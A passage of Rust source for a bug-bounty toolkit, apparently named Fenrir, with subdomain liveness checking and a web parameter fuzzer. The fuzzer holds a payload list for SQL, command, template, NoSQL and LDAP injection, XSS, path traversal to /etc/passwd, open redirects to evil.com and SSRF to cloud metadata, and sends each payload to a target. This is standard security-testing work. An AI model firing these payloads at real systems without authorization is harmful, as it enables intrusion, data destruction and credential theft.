    /// Check if a subdomain is alive by making HTTP/HTTPS requests
    async fn check_subdomain_alive(hostname: String) -> Result<DiscoveredSubdomain> {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .redirect(reqwest::redirect::Policy::limited(3))
            .build()?;

        let mut is_alive = false;
        let mut status_code = None;
        let mut content_type = None;
        let mut ips = Vec::new();

        // Try HTTPS first
        let https_url = format!("https://{}", hostname);
        if let Ok(response) = client.get(&https_url).send().await {
            is_alive = true;
            status_code = response.status().as_u16().into();

            if let Ok(ct) = response.headers().get("content-type").map(|v| v.to_str()).unwrap_or(Ok("")) {
                content_type = Some(ct.to_string());
            }
        }

        // Try HTTP if HTTPS failed
        if !is_alive {
            let http_url = format!("http://{}", hostname);
            if let Ok(response) = client.get(&http_url).send().await {
                is_alive = true;
                status_code = response.status().as_u16().into();

                if let Ok(ct) = response.headers().get("content-type").map(|v| v.to_str()).unwrap_or(Ok("")) {
                    content_type = Some(ct.to_string());
                }
            }
        }

        // Resolve IPs
        if let Ok(resolver) = trust_dns_resolver::TokioAsyncResolver::tokio_from_system_conf() {
            if let Ok(lookup) = resolver.ipv4_lookup(&hostname).await {
                ips = lookup.iter().map(|ip| ip.to_string()).collect();
            }
        }

        Ok(DiscoveredSubdomain {
            hostname,
            ips,
            is_alive,
            status_code,
            content_type,
            technologies: Vec::new(), // Would use Wappalyzer in production
            discovery_method: "dns_resolution".to_string(),
        })
    }

    /// Generate enumeration report
    pub fn generate_report(&self, result: &SubdomainEnumerationResult) -> String {
        let mut report = String::new();

        report.push_str("╔═══════════════════════════════════════════════════════════════════════════╗\n");
        report.push_str("║                     FENRIR SUBDOMAIN ENUMERATION REPORT                     ║\n");
        report.push_str("╚═══════════════════════════════════════════════════════════════════════════╝\n\n");

        report.push_str(&format!("Target Domain: {}\n", result.target_domain));
        report.push_str(&format!("Total Subdomains: {}\n", result.total_count));
        report.push_str(&format!("Alive Subdomains: {}\n", result.alive_count));
        report.push_str(&format!("Enumeration Time: {} seconds\n", result.enumeration_time_seconds));
        report.push_str(&format!("Discovery Methods: {}\n\n", result.discovery_methods.join(", ")));

        report.push_str("─────────────────────────────────────────────────────────────────────────────\n");
        report.push_str("DISCOVERED SUBDOMAINS:\n");
        report.push_str("─────────────────────────────────────────────────────────────────────────────\n\n");

        for subdomain in &result.subdomains {
            report.push_str(&format!("🌐 {}\n", subdomain.hostname));
            if subdomain.is_alive {
                report.push_str(&format!("   ✅ Alive - Status: {:?}\n", subdomain.status_code));
                if !subdomain.ips.is_empty() {
                    report.push_str(&format!("   📍 IP: {}\n", subdomain.ips.join(", ")));
                }
            } else {
                report.push_str("   ⚫ Status unknown\n");
            }
            report.push_str("\n");
        }

        report.push_str("═══════════════════════════════════════════════════════════════════════════\n");
        report
    }
}

// ============================================================================
// SECTION 3: PARAMETER FUZZER
// ============================================================================
// This section implements parameter fuzzing for OAuth and web applications.
//
// What is Parameter Fuzzing?
// Parameter fuzzing is the practice of sending various inputs to application
// parameters to trigger errors, vulnerabilities, or unexpected behavior.
//
// Common Use Cases:
// 1. Find hidden parameters (debug, test, admin-only)
// 2. Test parameter validation (SQL injection, XSS, etc.)
// 3. Discover business logic flaws
// 4. Identify information disclosure vulnerabilities
//
// How this tool helps:
// - Automated parameter fuzzing with smart payloads
// - Detects common vulnerability patterns
// - Generates detailed reports for bug bounty submissions

/// Represents a parameter fuzzing result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzResult {
    /// Parameter name that was fuzzed
    pub parameter_name: String,
    /// Original value
    pub original_value: Option<String>,
    /// Fuzzed value that triggered an issue
    pub fuzzed_value: String,
    /// Type of issue discovered
    pub issue_type: String,
    /// Severity level
    pub severity: String,
    /// HTTP response code
    pub response_code: u16,
    /// Response time in milliseconds
    pub response_time_ms: u64,
    /// Interesting patterns or data in response
    pub findings: String,
    /// Proof of concept
    pub proof_of_concept: String,
}

/// Parameter Fuzzer - Tests OAuth parameters and web app inputs
#[derive(Debug, Clone)]
pub struct ParameterFuzzer {
    /// Target URL to fuzz
    target_url: String,
    /// Parameters to fuzz (GET/POST)
    parameters: HashMap<String, String>,
    /// Whether to fuzz headers as well
    fuzz_headers: bool,
    /// Verbose output
    verbose: bool,
}

impl ParameterFuzzer {
    /// Create a new parameter fuzzer
    pub fn new(target_url: String, parameters: HashMap<String, String>, fuzz_headers: bool, verbose: bool) -> Self {
        Self {
            target_url,
            parameters,
            fuzz_headers,
            verbose,
        }
    }

    /// Run parameter fuzzing
    ///
    /// This method fuzzes each parameter with various payloads designed to
    /// trigger vulnerabilities or expose sensitive information.
    pub async fn fuzz(&self) -> Result<Vec<FuzzResult>> {
        let mut results = Vec::new();

        if self.verbose {
            println!("🔍 Starting parameter fuzzing...");
            println!("📍 Target: {}", self.target_url);
            println!("📊 Parameters to fuzz: {}", self.parameters.len());
        }

        // Fuzzing payloads organized by type
        let fuzz_payloads = self.get_fuzz_payloads();

        for (param_name, original_value) in &self.parameters {
            if self.verbose {
                println!("\n🔎 Fuzzing parameter: {}", param_name);
            }

            // Test each payload category
            for (category, payloads) in &fuzz_payloads {
                for payload in payloads {
                    // Skip if it's the original value
                    if original_value == payload {
                        continue;
                    }

                    // Send fuzzed request
                    match self.send_fuzzed_request(param_name, payload).await {
                        Ok(result) => {
                            if result.is_some() {
                                results.push(result.unwrap());
                            }
                        }
                        Err(e) => {
                            if self.verbose {
                                println!("⚠️  Error fuzzing {}: {}", param_name, e);
                            }
                        }
                    }
                }
            }
        }

        if self.verbose {
            println!("\n✅ Fuzzing complete! Found {} issues", results.len());
        }

        Ok(results)
    }

    /// Get fuzzing payloads organized by category
    fn get_fuzz_payloads(&self) -> HashMap<String, Vec<String>> {
        let mut payloads = HashMap::new();

        // SQL Injection payloads
        payloads.insert(
            "SQL Injection".to_string(),
            vec![
                "' OR '1'='1".to_string(),
                "' OR 1=1--".to_string(),
                "' UNION SELECT NULL--".to_string(),
                "1' ORDER BY 1--".to_string(),
                "'; DROP TABLE users--".to_string(),
                "1' AND 1=1--".to_string(),
                "admin'--".to_string(),
                "' OR 1=1#".to_string(),
                "' OR 'a'='a".to_string(),
            ],
        );

        // XSS payloads
        payloads.insert(
            "XSS".to_string(),
            vec![
                "<script>alert(1)</script>".to_string(),
                "<img src=x onerror=alert(1)>".to_string(),
                "<svg onload=alert(1)>".to_string(),
                "javascript:alert(1)".to_string(),
                "<iframe src=\"javascript:alert(1)\">".to_string(),
            ],
        );

        // Path traversal
        payloads.insert(
            "Path Traversal".to_string(),
            vec![
                "../../../etc/passwd".to_string(),
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts".to_string(),
                "....//....//....//etc/passwd".to_string(),
                "%2e%2e%2fetc%2fpasswd".to_string(),
            ],
        );

        // Open redirect
        payloads.insert(
            "Open Redirect".to_string(),
            vec![
                "https://evil.com".to_string(),
                "//evil.com".to_string(),
                "///evil.com".to_string(),
                "/\\evil.com".to_string(),
            ],
        );

        // SSRF (Server-Side Request Forgery)
        payloads.insert(
            "SSRF".to_string(),
            vec![
                "http://localhost".to_string(),
                "http://127.0.0.1".to_string(),
                "http://169.254.169.254".to_string(), // AWS metadata
                "http://[::1]".to_string(),
                "file:///etc/passwd".to_string(),
            ],
        );

        // Format string
        payloads.insert(
            "Format String".to_string(),
            vec![
                "%s".to_string(),
                "%x".to_string(),
                "%n".to_string(),
                "%p%p%p%p".to_string(),
                "AAAA%p%x%p".to_string(),
            ],
        );

        // Command injection
        payloads.insert(
            "Command Injection".to_string(),
            vec![
                "; ls -la".to_string(),
                "| cat /etc/passwd".to_string(),
                "`whoami`".to_string(),
                "$(id)".to_string(),
                "; id".to_string(),
            ],
        );

        // LDAP injection
        payloads.insert(
            "LDAP Injection".to_string(),
            vec![
                "*".to_string(),
                "*)(&".to_string(),
                "*(|(mail=*))".to_string(),
                "*(|(objectclass=*))".to_string(),
            ],
        );

        // NoSQL injection
        payloads.insert(
            "NoSQL Injection".to_string(),
            vec![
                "'; return db.admin.find(); //".to_string(),
                "'; return this.user == 'admin'; //".to_string(),
                "{\"$ne\": null}".to_string(),
                "{\"$gt\": \"\"}".to_string(),
            ],
        );

        // Template injection
        payloads.insert(
            "Template Injection".to_string(),
            vec![
                "{{7*7}}".to_string(),
                "${7*7}".to_string(),
                "#{7*7}".to_string(),
                "{{_self.env.display(\"id\")}}".to_string(),
                "{{config.items()}}".to_string(),
            ],
        );

        payloads
    }

    /// Send a fuzzed request with the modified parameter
    async fn send_fuzzed_request(&self, param_name: &str, fuzzed_value: &str) -> Result<Option<FuzzResult>> {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .build()?;

        // Build request with fuzzed parameter
        let start = std::time::Instant::now();

        // For GET requests, add to URL
        let url = if self.target_url.contains('?') {
            format!("{}&{}={}", self.target_url, param_name, urlencoding::encode(fuzzed_value))
        } else {
            format!("{}?{}={}", self.target_url, param_name, urlencoding::encode(fuzzed_value))
        };

        let response = client.get(&url).send().await?;
        let response_time = start.elapsed().as_millis() as u64;
        let status = response.status().as_u16();
        let body = response.text().await?;

        // Analyze response for interesting patterns
        let findings = self.analyze_response(&body, status);

        if findings.is_some() {
            Ok(Some(FuzzResult {
                parameter_name: param_name.to_string(),
                original_value: self.parameters.get(param_name).cloned(),
                fuzzed_value: fuzzed_value.to_string(),
                issue_type: findings.clone().unwrap().split(':').next().unwrap_or("Unknown").to_string(),
                severity: self.assess_severity(status, &body),
                response_code: status,
                response_time_ms: response_time,
                findings: findings.unwrap_or_default(),
                proof_of_concept: url,
            }))
        } else {
            Ok(None)
        }
    }

    /// Analyze response for interesting patterns
    fn analyze_response(&self, body: &str, status: u16) -> Option<String> {
        let interesting_patterns = vec![
            ("SQL Error", "mysql_fetch", "SQL syntax", "ORA-", "PostgreSQL"),
            ("Stack Trace", "Stack trace", "Exception in thread", "Fatal error", "Traceback"),
            ("Path Disclosure", "/var/www/", "/home/", "C:\\inetpub\\", "root@"),
            ("Debug Info", "DEBUG", "SQLSTATE", "Warning: mysql", "Notice:"),
            ("SSRF Success", "localhost", "127.0.0.1", "169.254.169.254", "metadata"),
            ("XSS Reflected", "<script>", "<img", "<svg", "javascript:"),
            ("Information Disclosure", "password", "secret", "api_key", "token"),
        ];

        for pattern_set in interesting_patterns {
            // Iterate through all tuple elements except the first (which is the category name)
            let patterns = [pattern_set.1, pattern_set.2, pattern_set.3, pattern_set.4];
            for pattern in patterns {
                if body.to_lowercase().contains(&pattern.to_lowercase()) {
                    return Some(format!("{}: Found \"{}\" in response", pattern_set.0, pattern));
                }
            }
        }

        // Check status codes
        if status >= 500 {
            return Some(format!("Server Error: HTTP {}", status));
        } else if status == 403 {
            return Some("Access Denied: Possible WAF or protection".to_string());
        } else if status == 401 {
            return Some("Unauthorized: Authentication required".to_string());
        }

        None
    }

    /// Assess severity based on response
    fn assess_severity(&self, status: u16, body: &str) -> String {
        let body_lower = body.to_lowercase();

        // Critical: SQL errors, stack traces, full path disclosure
        if body_lower.contains("sql") && body_lower.contains("error") {
            return "Critical".to_string();
        }
        if body_lower.contains("stack trace") || body_lower.contains("exception") {
            return "Critical".to_string();
        }
        if body_lower.contains("/var/www") || body_lower.contains("c:\\inetpub") {
            return "Critical".to_string();
        }

        // High: SSRF, debug info
        if body_lower.contains("localhost") || body_lower.contains("127.0.0.1") {
            return "High".to_string();
        }
        if body_lower.contains("debug") || body_lower.contains("trace") {
            return "High".to_string();
        }

        // Medium: Information disclosure
        if body_lower.contains("password") || body_lower.contains("secret") {
            return "Medium".to_string();
        }

        // Low: Access denied, etc.
        if status == 403 {
            return "Low".to_string();
        }

        "Info".to_string()
    }

    /// Generate fuzzing report
    pub fn generate_report(&self, results: &[FuzzResult]) -> String {
        let mut report = String::new();

        report.push_str("╔═══════════════════════════════════════════════════════════════════════════╗\n");
        report.push_str("║                       FENRIR PARAMETER FUZZING REPORT                        ║\n");
        report.push_str("╚═══════════════════════════════════════════════════════════════════════════╝\n\n");

        report.push_str(&format!("Target URL: {}\n", self.target_url));
        report.push_str(&format!("Total Issues Found: {}\n\n", results.len()));

        for (i, result) in results.iter().enumerate() {
            report.push_str(&format!("┌─ ISSUE #{}: {}\n", i + 1, result.issue_type));
            report.push_str(&format!("│ Parameter: {}\n", result.parameter_name));
            report.push_str(&format!("│ Severity: {}\n", result.severity));
            report.push_str(&format!("│ Response Code: {}\n", result.response_code));
            report.push_str(&format!("│ Response Time: {}ms\n", result.response_time_ms));
            report.push_str(&format!("│ Findings: {}\n", result.findings));
            report.push_str("│\n");
            report.push_str("│ Proof of Concept:\n");
            report.push_str(&format!("│   {}\n", result.proof_of_concept));
            report.push_str("└─────────────────────────────────────────────────────────────────────\n\n");
        }

        report.push_str("═══════════════════════════════════════════════════════════════════════════\n");
        report
    }
}

// ============================================================================
// EXPORTS AND INTEGRATION
// ============================================================================

/// Bug Bounty Tools - Main entry point for all bug bounty testing features
pub struct BugBountyTools;

impl BugBountyTools {
    /// Quick OAuth analysis helper
    pub async fn analyze_oauth(
        auth_endpoint: String,
        redirect_uri: String,
        client_id: String,
    ) -> Result<String> {
        let flow = OAuthFlow {
            flow_type: OAuthFlowType::AuthorizationCode,
            authorization_endpoint: auth_endpoint,
            token_endpoint: String::new(), // Not needed for basic analysis
            client_id,
            redirect_uri,
            scope: String::new(),
            state: None,
            response_type: "code".to_string(),
        };

        let analyzer = OAuthFlowAnalyzer::new(flow, true, true);
        let vulnerabilities = analyzer.analyze_flow().await?;

        Ok(analyzer.generate_report(&vulnerabilities))
    }

    /// Quick subdomain enumeration helper
    pub async fn enumerate_subdomains(target: String) -> Result<String> {
        let enumerator = SubdomainEnumerator::new(target, true, true, 10);
        let result = enumerator.enumerate().await?;

        Ok(enumerator.generate_report(&result))
    }
}
